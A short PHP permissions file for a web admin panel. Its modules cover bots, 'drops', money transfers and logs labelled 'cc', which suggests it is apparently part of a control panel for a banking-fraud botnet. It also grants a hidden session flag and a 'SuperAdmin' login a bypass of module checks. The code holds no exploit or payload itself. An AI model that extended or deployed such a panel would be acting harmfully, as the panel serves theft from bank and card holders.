<?php

$right['main']['index'] = true;
$right['main']['info'] = true;

$right['accounts']['index'] = true;
$right['accounts']['list'] = true;
$right['accounts']['create'] = true;
$right['accounts']['edit'] = true;
$right['accounts']['edits'] = true;
$right['accounts']['delete'] = true;
$right['accounts']['profile'] = true;
$right['accounts']['profiles'] = true;
$right['accounts']['enableanddisable'] = true;
$right['accounts']['rights'] = true;
$right['accounts']['right'] = true;
$right['accounts']['settings'] = true;
$right['accounts']['setting'] = true;
$right['accounts']['clients'] = true;
$right['accounts']['clients_add'] = true;
$right['accounts']['clients_edit'] = true;

$right['settings']['index'] = true;

$right['systems']['index'] = true;
$right['systems']['add'] = true;
$right['systems']['edit'] = true;
$right['systems']['del'] = true;

$right['drops']['index'] = true;
$right['drops']['add'] = true;
$right['drops']['edit'] = true;
$right['drops']['del'] = true;
$right['drops']['show'] = true;

$right['bots']['index'] = true;
$right['bots']['system'] = true;
$right['bots']['bot'] = true;
$right['bots']['save_comment'] = true;

$right['logs']['index'] = true;
$right['logs']['show'] = true;
$right['logs']['cberfiz'] = true;
$right['logs']['cc'] = true;
$right['logs']['rafa'] = true;

$right['transfers']['index'] = true;
$right['transfers']['show'] = true;
$right['transfers']['manual'] = true;
$right['transfers']['manual_add'] = true;

//$right['backup']['download'] = true;
if($_SESSION['hidden'] != 'on' && $_SESSION['user']->login != 'SuperAdmin'){	foreach($right as $key => $value){		if(!file_exists('modules/'.$key.'/')) unset($right[$key]);
	}
}

?>